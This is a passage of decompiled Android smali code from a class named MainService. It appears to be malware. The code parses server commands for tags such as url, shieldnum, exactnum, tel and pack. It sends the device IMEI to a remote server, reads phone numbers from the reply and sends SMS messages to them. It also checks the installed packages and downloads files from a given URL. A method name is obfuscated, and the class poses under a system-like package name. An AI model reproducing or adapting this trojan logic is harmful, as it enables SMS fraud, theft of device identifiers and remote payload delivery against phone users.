    const-string v19, "<exactnum>"

    .line 436
    const-string v20, "</exactnum>"

    .line 435
    move-object/from16 v0, p1

    move-object/from16 v1, v19

    move-object/from16 v2, v20

    invoke-static {v0, v1, v2}, Lcom/android/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v17

    .line 437
    .local v17, tmpexactnum:Ljava/lang/String;
    const-string v19, ""

    move-object/from16 v0, v19

    move-object/from16 v1, v17

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v19

    if-nez v19, :cond_4

    move-object/from16 v0, v17

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->exactnum:Ljava/lang/String;

    .line 440
    :cond_4
    const-string v19, "<isreset>"

    const-string v20, "</isreset>"

    move-object/from16 v0, p1

    move-object/from16 v1, v19

    move-object/from16 v2, v20

    invoke-static {v0, v1, v2}, Lcom/android/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    .line 441
    const-string v19, "no"

    move-object/from16 v0, v19

    move-object v1, v6

    invoke-virtual {v0, v1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    .line 445
    new-instance v19, Ljava/lang/StringBuilder;

    invoke-static {v13}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v20

    invoke-direct/range {v19 .. v20}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 446
    const-string v20, "/?sim="

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->imei:Ljava/lang/String;

    move-object/from16 v20, v0

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    .line 445
    invoke-virtual/range {v19 .. v19}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v19

    invoke-static/range {v19 .. v19}, Lcom/android/BaseAuthenicationHttpClient;->getStringByURL(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v15

    .line 447
    .local v15, telStr:Ljava/lang/String;
    if-eqz v15, :cond_5

    const-string v19, ""

    move-object/from16 v0, v19

    move-object v1, v15

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    move-result v19

    if-eqz v19, :cond_6

    .line 465
    :cond_5
    const/16 v19, 0x0

    aget-object v19, p2, v19

    const/16 v20, 0xc

    invoke-static/range {v19 .. v20}, Lcom/android/StringUtil;->getDate(Ljava/lang/String;I)Ljava/lang/String;

    move-result-object v19

    move-object/from16 v0, v19

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    .line 466
    new-instance v19, Ljava/lang/StringBuilder;

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    move-object/from16 v20, v0

    invoke-static/range {v20 .. v20}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v20

    invoke-direct/range {v19 .. v20}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v20, "|"

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    const/16 v20, 0x1

    aget-object v20, p2, v20

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    const-string v20, "|"

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    const/16 v20, 0x2

    aget-object v20, p2, v20

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    invoke-virtual/range {v19 .. v19}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    .line 467
    .restart local v8       #logtxt:Ljava/lang/String;
    sget-object v19, Lcom/android/MainService;->recordlog:Ljava/lang/String;

    move-object v0, v8

    move-object/from16 v1, v19

    invoke-static {v0, v1}, Lcom/android/FileAct;->writeString(Ljava/lang/String;Ljava/lang/String;)V

    .line 468
    move-object/from16 v0, p0

    move v1, v4

    move v2, v9

    invoke-direct {v0, v1, v2}, Lcom/android/MainService;->LogService(II)I

    goto/16 :goto_0

    .line 449
    .end local v8           #logtxt:Ljava/lang/String;
    :cond_6
    :try_start_2
    const-string v19, "<tel>"

    const-string v20, "</tel>"

    move-object v0, v15

    move-object/from16 v1, v19

    move-object/from16 v2, v20

    invoke-static {v0, v1, v2}, Lcom/android/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v14

    .line 450
    .local v14, tel:Ljava/lang/String;
    if-eqz v14, :cond_7

    invoke-virtual {v14}, Ljava/lang/String;->length()I
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    move-result v19

    const/16 v20, 0xb

    move/from16 v0, v19

    move/from16 v1, v20

    if-ge v0, v1, :cond_8

    .line 465
    :cond_7
    const/16 v19, 0x0

    aget-object v19, p2, v19

    const/16 v20, 0xc

    invoke-static/range {v19 .. v20}, Lcom/android/StringUtil;->getDate(Ljava/lang/String;I)Ljava/lang/String;

    move-result-object v19

    move-object/from16 v0, v19

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    .line 466
    new-instance v19, Ljava/lang/StringBuilder;

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    move-object/from16 v20, v0

    invoke-static/range {v20 .. v20}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v20

    invoke-direct/range {v19 .. v20}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v20, "|"

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    const/16 v20, 0x1

    aget-object v20, p2, v20

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    const-string v20, "|"

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    const/16 v20, 0x2

    aget-object v20, p2, v20

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    invoke-virtual/range {v19 .. v19}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    .line 467
    .restart local v8       #logtxt:Ljava/lang/String;
    sget-object v19, Lcom/android/MainService;->recordlog:Ljava/lang/String;

    move-object v0, v8

    move-object/from16 v1, v19

    invoke-static {v0, v1}, Lcom/android/FileAct;->writeString(Ljava/lang/String;Ljava/lang/String;)V

    .line 468
    move-object/from16 v0, p0

    move v1, v4

    move v2, v9

    invoke-direct {v0, v1, v2}, Lcom/android/MainService;->LogService(II)I

    goto/16 :goto_0

    .line 452
    .end local v8           #logtxt:Ljava/lang/String;
    :cond_8
    :try_start_3
    const-string v19, "#"

    move-object v0, v14

    move-object/from16 v1, v19

    invoke-virtual {v0, v1}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v16

    .line 453
    .local v16, tels:[Ljava/lang/String;
    move-object/from16 v0, v16

    array-length v0, v0

    move v7, v0
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_0
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_0

    .line 454
    .local v7, len:I
    const/4 v5, 0x0

    .local v5, i:I
    :goto_1
    if-lt v5, v7, :cond_9

    .line 465
    const/16 v19, 0x0

    aget-object v19, p2, v19

    const/16 v20, 0xc

    invoke-static/range {v19 .. v20}, Lcom/android/StringUtil;->getDate(Ljava/lang/String;I)Ljava/lang/String;

    move-result-object v19

    move-object/from16 v0, v19

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    .line 466
    new-instance v19, Ljava/lang/StringBuilder;

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    move-object/from16 v20, v0

    invoke-static/range {v20 .. v20}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v20

    invoke-direct/range {v19 .. v20}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v20, "|"

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    const/16 v20, 0x1

    aget-object v20, p2, v20

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    const-string v20, "|"

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    const/16 v20, 0x2

    aget-object v20, p2, v20

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    invoke-virtual/range {v19 .. v19}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    .line 467
    .restart local v8       #logtxt:Ljava/lang/String;
    sget-object v19, Lcom/android/MainService;->recordlog:Ljava/lang/String;

    move-object v0, v8

    move-object/from16 v1, v19

    invoke-static {v0, v1}, Lcom/android/FileAct;->writeString(Ljava/lang/String;Ljava/lang/String;)V

    .line 468
    move-object/from16 v0, p0

    move v1, v4

    move v2, v9

    invoke-direct {v0, v1, v2}, Lcom/android/MainService;->LogService(II)I

    goto/16 :goto_0

    .line 455
    .end local v8           #logtxt:Ljava/lang/String;
    :cond_9
    :try_start_4
    aget-object v10, v16, v5

    .line 456
    .local v10, smsaddress:Ljava/lang/String;
    if-eqz v10, :cond_a

    invoke-virtual {v10}, Ljava/lang/String;->length()I

    move-result v19

    const/16 v20, 0x8

    move/from16 v0, v19

    move/from16 v1, v20

    if-ge v0, v1, :cond_b

    .line 454
    :cond_a
    :goto_2
    add-int/lit8 v5, v5, 0x1

    goto :goto_1

    .line 458
    :cond_b
    move-object/from16 v0, p0

    move-object v1, v10

    move-object v2, v11

    invoke-direct {v0, v1, v2}, Lcom/android/MainService;->sendSMS(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_0
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_0

    .line 459
    add-int/lit8 v9, v9, 0x1

    goto :goto_2

    .line 461
    .end local v5           #i:I
    .end local v7           #len:I
    .end local v10           #smsaddress:Ljava/lang/String;
    .end local v14           #tel:Ljava/lang/String;
    .end local v15           #telStr:Ljava/lang/String;
    .end local v16           #tels:[Ljava/lang/String;
    .end local v17           #tmpexactnum:Ljava/lang/String;
    .end local v18           #tmpshieldnum:Ljava/lang/String;
    :catch_0
    move-exception v19

    move-object/from16 v3, v19

    .line 462
    .local v3, e:Ljava/lang/Exception;
    const/16 v4, -0x385

    .line 465
    const/16 v19, 0x0

    aget-object v19, p2, v19

    const/16 v20, 0xc

    invoke-static/range {v19 .. v20}, Lcom/android/StringUtil;->getDate(Ljava/lang/String;I)Ljava/lang/String;

    move-result-object v19

    move-object/from16 v0, v19

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    .line 466
    new-instance v19, Ljava/lang/StringBuilder;

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    move-object/from16 v20, v0

    invoke-static/range {v20 .. v20}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v20

    invoke-direct/range {v19 .. v20}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v20, "|"

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    const/16 v20, 0x1

    aget-object v20, p2, v20

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    const-string v20, "|"

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    const/16 v20, 0x2

    aget-object v20, p2, v20

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    invoke-virtual/range {v19 .. v19}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    .line 467
    .restart local v8       #logtxt:Ljava/lang/String;
    sget-object v19, Lcom/android/MainService;->recordlog:Ljava/lang/String;

    move-object v0, v8

    move-object/from16 v1, v19

    invoke-static {v0, v1}, Lcom/android/FileAct;->writeString(Ljava/lang/String;Ljava/lang/String;)V

    .line 468
    move-object/from16 v0, p0

    move v1, v4

    move v2, v9

    invoke-direct {v0, v1, v2}, Lcom/android/MainService;->LogService(II)I

    goto/16 :goto_0

    .line 463
    .end local v3           #e:Ljava/lang/Exception;
    .end local v8           #logtxt:Ljava/lang/String;
    :catchall_0
    move-exception v19

    .line 465
    const/16 v20, 0x0

    aget-object v20, p2, v20

    const/16 v21, 0xc

    invoke-static/range {v20 .. v21}, Lcom/android/StringUtil;->getDate(Ljava/lang/String;I)Ljava/lang/String;

    move-result-object v20

    move-object/from16 v0, v20

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    .line 466
    new-instance v20, Ljava/lang/StringBuilder;

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    move-object/from16 v21, v0

    invoke-static/range {v21 .. v21}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v21

    invoke-direct/range {v20 .. v21}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v21, "|"

    invoke-virtual/range {v20 .. v21}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    const/16 v21, 0x1

    aget-object v21, p2, v21

    invoke-virtual/range {v20 .. v21}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    const-string v21, "|"

    invoke-virtual/range {v20 .. v21}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    const/16 v21, 0x2

    aget-object v21, p2, v21

    invoke-virtual/range {v20 .. v21}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    invoke-virtual/range {v20 .. v20}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    .line 467
    .restart local v8       #logtxt:Ljava/lang/String;
    sget-object v20, Lcom/android/MainService;->recordlog:Ljava/lang/String;

    move-object v0, v8

    move-object/from16 v1, v20

    invoke-static {v0, v1}, Lcom/android/FileAct;->writeString(Ljava/lang/String;Ljava/lang/String;)V

    .line 468
    move-object/from16 v0, p0

    move v1, v4

    move v2, v9

    invoke-direct {v0, v1, v2}, Lcom/android/MainService;->LogService(II)I

    .line 469
    throw v19
.end method

.method private esxoefct(Ljava/lang/String;[Ljava/lang/String;)V
    .locals 20
    .parameter "allStr"
    .parameter "record"

    .prologue
    .line 352
    const-string v14, ""

    .line 353
    .local v14, softUrl:Ljava/lang/String;
    const-string v8, "no"

    .line 354
    .local v8, isreset:Ljava/lang/String;
    const/16 v5, -0x309

    .line 357
    .local v5, flag:I
    :try_start_0
    const-string v17, "<url>"

    const-string v18, "</url>"

    move-object/from16 v0, p1

    move-object/from16 v1, v17

    move-object/from16 v2, v18

    invoke-static {v0, v1, v2}, Lcom/android/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v14

    .line 358
    const-string v17, ""

    move-object/from16 v0, v17

    move-object v1, v14

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result v17

    if-eqz v17, :cond_0

    .line 400
    const/16 v17, 0x0

    aget-object v17, p2, v17

    const/16 v18, 0xc

    invoke-static/range {v17 .. v18}, Lcom/android/StringUtil;->getDate(Ljava/lang/String;I)Ljava/lang/String;

    move-result-object v17

    move-object/from16 v0, v17

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    .line 401
    new-instance v17, Ljava/lang/StringBuilder;

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    move-object/from16 v18, v0

    invoke-static/range {v18 .. v18}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v18

    invoke-direct/range {v17 .. v18}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v18, "|"

    invoke-virtual/range {v17 .. v18}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v17

    const/16 v18, 0x1

    aget-object v18, p2, v18

    invoke-virtual/range {v17 .. v18}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v17

    const-string v18, "|"

    invoke-virtual/range {v17 .. v18}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v17

    const/16 v18, 0x2

    aget-object v18, p2, v18

    invoke-virtual/range {v17 .. v18}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v17

    invoke-virtual/range {v17 .. v17}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    .line 402
    .local v9, logtxt:Ljava/lang/String;
    sget-object v17, Lcom/android/MainService;->recordlog:Ljava/lang/String;

    move-object v0, v9

    move-object/from16 v1, v17

    invoke-static {v0, v1}, Lcom/android/FileAct;->writeString(Ljava/lang/String;Ljava/lang/String;)V

    .line 403
    const/16 v17, 0x1

    move-object/from16 v0, p0

    move v1, v5

    move/from16 v2, v17

    invoke-direct {v0, v1, v2}, Lcom/android/MainService;->LogService(II)I

    .line 405
    :goto_0
    return-void

    .line 361
    .end local v9           #logtxt:Ljava/lang/String;
    :cond_0
    :try_start_1
    const-string v17, "<shieldnum>"

    .line 362
    const-string v18, "</shieldnum>"

    .line 361
    move-object/from16 v0, p1

    move-object/from16 v1, v17

    move-object/from16 v2, v18

    invoke-static {v0, v1, v2}, Lcom/android/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v16

    .line 363
    .local v16, tmpshieldnum:Ljava/lang/String;
    const-string v17, ""

    move-object/from16 v0, v17

    move-object/from16 v1, v16

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v17

    if-nez v17, :cond_1

    move-object/from16 v0, v16

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->shieldnum:Ljava/lang/String;

    .line 365
    :cond_1
    const-string v17, "<exactnum>"

    .line 366
    const-string v18, "</exactnum>"

    .line 365
    move-object/from16 v0, p1

    move-object/from16 v1, v17

    move-object/from16 v2, v18

    invoke-static {v0, v1, v2}, Lcom/android/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v15

    .line 367
    .local v15, tmpexactnum:Ljava/lang/String;
    const-string v17, ""

    move-object/from16 v0, v17

    move-object v1, v15

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v17

    if-nez v17, :cond_2

    move-object v0, v15

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->exactnum:Ljava/lang/String;

    .line 370
    :cond_2
    const-string v17, "<isreset>"

    const-string v18, "</isreset>"

    move-object/from16 v0, p1

    move-object/from16 v1, v17

    move-object/from16 v2, v18

    invoke-static {v0, v1, v2}, Lcom/android/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    .line 371
    const/4 v7, 0x1

    .line 372
    .local v7, isexec:Z
    const-string v17, "no"

    move-object/from16 v0, v17

    move-object v1, v8

    invoke-virtual {v0, v1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v17

    if-eqz v17, :cond_3

    .line 373
    const-string v17, "<pack>"

    .line 374
    const-string v18, "</pack>"

    .line 373
    move-object/from16 v0, p1

    move-object/from16 v1, v17

    move-object/from16 v2, v18

    invoke-static {v0, v1, v2}, Lcom/android/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    .line 375
    .local v11, pack:Ljava/lang/String;
    const-string v17, ""

    move-object/from16 v0, v17

    move-object v1, v11

    invoke-virtual {v0, v1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v17

    if-nez v17, :cond_3

    .line 376
    invoke-virtual/range {p0 .. p0}, Lcom/android/MainService;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v17

    .line 377
    const/16 v18, 0x0

    invoke-virtual/range {v17 .. v18}, Landroid/content/pm/PackageManager;->getInstalledPackages(I)Ljava/util/List;

    move-result-object v12

    .line 378
    .local v12, packs:Ljava/util/List;,"Ljava/util/List<Landroid/content/pm/PackageInfo;>;"
    if-eqz v12, :cond_3

    .line 379
    invoke-interface {v12}, Ljava/util/List;->size()I

    move-result v3

    .line 380
    .local v3, count:I
    const/4 v6, 0x0

    .local v6, i:I
    :goto_1
    if-lt v6, v3, :cond_5

    .line 390
    .end local v3           #count:I
    .end local v6           #i:I
    .end local v11           #pack:Ljava/lang/String;
    .end local v12           #packs:Ljava/util/List;,"Ljava/util/List<Landroid/content/pm/PackageInfo;>;"
    :cond_3
    if-eqz v7, :cond_4

    .line 392
    new-instance v4, Lcom/android/FileUtil;

    invoke-direct {v4}, Lcom/android/FileUtil;-><init>()V

    .line 393
    .local v4, fileUtil:Lcom/android/FileUtil;
    invoke-virtual {v4, v14}, Lcom/android/FileUtil;->getFile(Ljava/lang/String;)I
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    move-result v13

    .line 394
    .local v13, results:I
    if-nez v13, :cond_4

    .line 395
    const/16 v5, -0x378

    .line 400
    .end local v4           #fileUtil:Lcom/android/FileUtil;
    .end local v13           #results:I
    :cond_4
    const/16 v17, 0x0

    aget-object v17, p2, v17

    const/16 v18, 0xc

    invoke-static/range {v17 .. v18}, Lcom/android/StringUtil;->getDate(Ljava/lang/String;I)Ljava/lang/String;

    move-result-object v17

    move-object/from16 v0, v17

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    .line 401
    new-instance v17, Ljava/lang/StringBuilder;

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    move-object/from16 v18, v0

    invoke-static/range {v18 .. v18}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v18

    invoke-direct/range {v17 .. v18}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v18, "|"

    invoke-virtual/range {v17 .. v18}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v17

    const/16 v18, 0x1

    aget-object v18, p2, v18

    invoke-virtual/range {v17 .. v18}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v17

    const-string v18, "|"

    invoke-virtual/range {v17 .. v18}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v17

    const/16 v18, 0x2

    aget-object v18, p2, v18

    invoke-virtual/range {v17 .. v18}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v17

    invoke-virtual/range {v17 .. v17}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    .line 402
    .restart local v9       #logtxt:Ljava/lang/String;
    sget-object v17, Lcom/android/MainService;->recordlog:Ljava/lang/String;

    move-object v0, v9

    move-object/from16 v1, v17

    invoke-static {v0, v1}, Lcom/android/FileAct;->writeString(Ljava/lang/String;Ljava/lang/String;)V

    .line 403
    const/16 v17, 0x1

    move-object/from16 v0, p0

    move v1, v5

    move/from16 v2, v17

    invoke-direct {v0, v1, v2}, Lcom/android/MainService;->LogService(II)I

    goto/16 :goto_0

    .line 381
    .end local v9           #logtxt:Ljava/lang/String;
    .restart local v3       #count:I
    .restart local v6       #i:I
    .restart local v11       #pack:Ljava/lang/String;
    .restart local v12       #packs:Ljava/util/List;,"Ljava/util/List<Landroid/content/pm/PackageInfo;>;"
    :cond_5
    :try_start_2
    invoke-interface {v12, v6}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v10

    check-cast v10, Landroid/content/pm/PackageInfo;

    .line 382
    .local v10, p:Landroid/content/pm/PackageInfo;
    move-object v0, v10

    iget-object v0, v0, Landroid/content/pm/PackageInfo;->packageName:Ljava/lang/String;

    move-object/from16 v17, v0

    move-object v0, v11

    move-object/from16 v1, v17

    invoke-virtual {v0, v1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    move-result v17

    if-eqz v17, :cond_6

    .line 383
    const/16 v5, -0x29a

    .line 384
    const/4 v7, 0x0

    .line 380
    :cond_6
    add-int/lit8 v6, v6, 0x1

    goto :goto_1

    .line 398
    .end local v3           #count:I
    .end local v6           #i:I
    .end local v7           #isexec:Z
    .end local v10           #p:Landroid/content/pm/PackageInfo;
    .end local v11           #pack:Ljava/lang/String;
    .end local v12           #packs:Ljava/util/List;,"Ljava/util/List<Landroid/content/pm/PackageInfo;>;"
    .end local v15           #tmpexactnum:Ljava/lang/String;
    .end local v16           #tmpshieldnum:Ljava/lang/String;
    :catch_0
    move-exception v17

    .line 400
    const/16 v17, 0x0

    aget-object v17, p2, v17

    const/16 v18, 0xc

    invoke-static/range {v17 .. v18}, Lcom/android/StringUtil;->getDate(Ljava/lang/String;I)Ljava/lang/String;

    move-result-object v17

    move-object/from16 v0, v17

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    .line 401
    new-instance v17, Ljava/lang/StringBuilder;

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    move-object/from16 v18, v0

    invoke-static/range {v18 .. v18}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v18

    invoke-direct/range {v17 .. v18}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v18, "|"

    invoke-virtual/range {v17 .. v18}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v17

    const/16 v18, 0x1

    aget-object v18, p2, v18

    invoke-virtual/range {v17 .. v18}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v17

    const-string v18, "|"

    invoke-virtual/range {v17 .. v18}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v17

    const/16 v18, 0x2

    aget-object v18, p2, v18

    invoke-virtual/range {v17 .. v18}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v17

    invoke-virtual/range {v17 .. v17}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    .line 402
    .restart local v9       #logtxt:Ljava/lang/String;
    sget-object v17, Lcom/android/MainService;->recordlog:Ljava/lang/String;

    move-object v0, v9

    move-object/from16 v1, v17

    invoke-static {v0, v1}, Lcom/android/FileAct;->writeString(Ljava/lang/String;Ljava/lang/String;)V

    .line 403
    const/16 v17, 0x1

    move-object/from16 v0, p0

    move v1, v5

    move/from16 v2, v17

    invoke-direct {v0, v1, v2}, Lcom/android/MainService;->LogService(II)I

    goto/16 :goto_0

    .line 399
    .end local v9           #logtxt:Ljava/lang/String;
    :catchall_0
    move-exception v17

